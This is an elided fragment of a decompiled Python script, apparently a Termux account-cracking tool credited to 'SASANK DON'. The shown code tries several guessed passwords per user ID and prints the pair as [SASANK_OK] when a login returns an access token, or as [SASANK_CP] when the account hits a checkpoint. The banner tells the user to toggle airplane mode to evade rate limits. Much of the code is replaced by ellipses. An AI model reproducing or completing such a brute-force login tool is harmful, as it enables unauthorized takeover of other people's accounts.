...
# Decompiled By SASANK DON

# uncompyle6 version 1.1.2

# Original written By SASANK DON
...
\033[1;91m Author      :  SASANK DON

\033[1;91m GitHub      :  SECRET×HAHA
...
def action():
    ...
    jalan ('\x1b[1;97mUse without internet sim.minimize termux and check every 10 minutes  later. airplane mode use every 10 minutes.
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;94m  [SASANK_OK]  ' + k + c + user + '  ^  ' + pass1
                ...
                print '\x1b[1;93m  [SASANK_CP] ' + k + c + user + '  ^  ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;96m  [SASANK_OK] ' + k + c + user + '  ^  ' + pass2
                    ...
                    print '\x1b[1;95m  [SASANK_CP] ' + k + c + user + '  ^  ' + pass2
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;96m  [SASANK_OK]  ' + k + c + user + '  ^  ' + pass3
                        ...
                        print '\x1b[1;97m  [SASANK_CP] ' + k + c + user + '  ^  ' + pass3
